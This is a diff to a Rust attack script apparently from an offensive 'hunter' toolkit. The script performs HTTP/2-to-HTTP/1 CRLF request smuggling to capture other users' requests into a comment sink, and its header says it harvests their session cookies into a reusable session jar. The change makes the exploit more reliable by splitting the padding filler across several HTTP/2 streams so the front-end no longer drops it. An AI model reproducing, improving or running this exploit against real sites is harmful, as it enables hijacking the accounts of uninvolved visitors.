@@ -1,7 +1,7 @@
 #!/usr/bin/env rust-script
 //! name: h2_crlf_fill
 //! description: H2->H1 CRLF-split victim-request capturer with a deterministic filler - arms a hungry smuggled `POST /post/comment` (over-long Content-Length) on an h2 stream, HOLDS the client connection open so the front-end keeps routing other clients' traffic into that pinned upstream connection, then completes the body with a padded filler stream of our own, reads the comment sink and extracts every session= value the victim's captured Cookie header leaked; verified sessions are written as an http_session jar. Deterministic where h2_crlf_capture waits for the victim's bytes to fill the body exactly.
-//! version: 1.0.1
+//! version: 1.0.2
 //! args: <base-url> [--sink /post?postId=1] [--post-id 1] [--over 700] [--gap-ms 700] [--wait-secs 0] [--rounds 40] [--read-ms 1500] [--verify-path /admin] [--out JAR] [--selftest]
 //! keywords: 漏洞猎手套件, hunter, h2, http2, crlf, injection, request-splitting, request-smuggling, victim-capture, session-theft, comment-sink, hpack
 //!
@@ -458,12 +458,31 @@ async fn run(o: &Opts) -> Result<Value, String> {
 
         // Finish the body ourselves: the padded filler supplies the whole overhang when
         // the victim did not, so every attempt commits a comment we can inspect.
-        let pad = vec![b'P'; o.over + 400];
-        let filler = send_stream(&mut tls, 3, &o.host, "/", &[(b"pad".to_vec(), pad)]).await;
-        let follow = match filler {
-            Ok(()) => read_one(&mut tls, &mut dec, 3, o.read_ms).await,
-            Err(e) => json!({"error": e}),
-        };
+        // A single huge pad header is dropped by the front-end once the header list
+        // grows (observed above ~1100 bytes), so the body never completes. Chunk the
+        // pad across several streams instead: every chunk lands in the same pinned
+        // upstream body and together they supply the whole overhang.
+        let total = o.over + 400;
+        let mut follow = json!({"status": null});
+        let mut c = 0usize;
+        while c * 600 < total {
+            let sid = 3 + (c as u32) * 2;
+            let take = total.saturating_sub(c * 600).min(600);
+            let pad = vec![b'P'; take];
+            match send_stream(&mut tls, sid, &o.host, "/", &[(b"pad".to_vec(), pad)]).await {
+                Ok(()) => {
+                    let row = read_one(&mut tls, &mut dec, sid, o.read_ms).await;
+                    if row["status"].is_string() {
+                        follow = row;
+                    }
+                }
+                Err(e) => {
+                    follow = json!({"error": e});
+                    break;
+                }
+            }
+            c += 1;
+        }
         drop(tls);
 
         // Read the sink every `--read-every` rounds: a committed comment holds the
